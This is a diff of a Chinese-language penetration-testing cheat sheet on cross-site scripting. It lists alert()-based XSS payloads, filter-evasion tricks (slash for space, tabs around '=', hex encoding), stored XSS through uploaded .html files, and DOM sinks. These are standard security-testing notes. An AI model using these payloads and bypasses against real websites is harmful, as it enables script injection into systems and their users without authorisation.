@@ -1,8 +1,6 @@
-⚠️要么闭合标签，要么闭合引号⚠️  
-
 ## 常用POC:
 - `"><script>alert(1)</script>`  
-- `<img src=1 onerror=alert(1)>`  
+- `<image src=1 onerror=alert(1)>`  
 - `" autofocus onfocus=alert(1) x="`  
 - `<a href="javascript:alert(1)">`  
 - `javascript:alert(1);`  
@@ -12,7 +10,10 @@ JavaScript伪协议，超链接的地方就可能会存在
 - `'-alert(1)-'`  
 单引号作用：跳出前一个js
 
-## 编码绕过POC：
+## 绕过防护POC：
+- 在标签中`/`可代替空格  
+- = 两边添加TAB键  
+- poc进行16进制编码，去掉`;`仍然可执行  
 - `&apos;-alert(1)-&apos;`  
 - `';alert(1)//`
 - 当单引号被转义时  
@@ -40,7 +41,7 @@ JavaScript伪协议，超链接的地方就可能会存在
 ```
 
 ## 上传文件导致存储型XSS
-上传文件修改为 `.html` ，内容为 `<img src=1 onerror=alert(document.domain)>`
+上传文件修改为 `.html` ，内容为 `<image src=1 onerror=alert(document.domain)>`
 
 ## DOM XSS出现位置函数
 `document.write、location.search、eval（）、location、someDOMElement.innerHTML/uterHTML/insertAdjacentHTML/onevent`
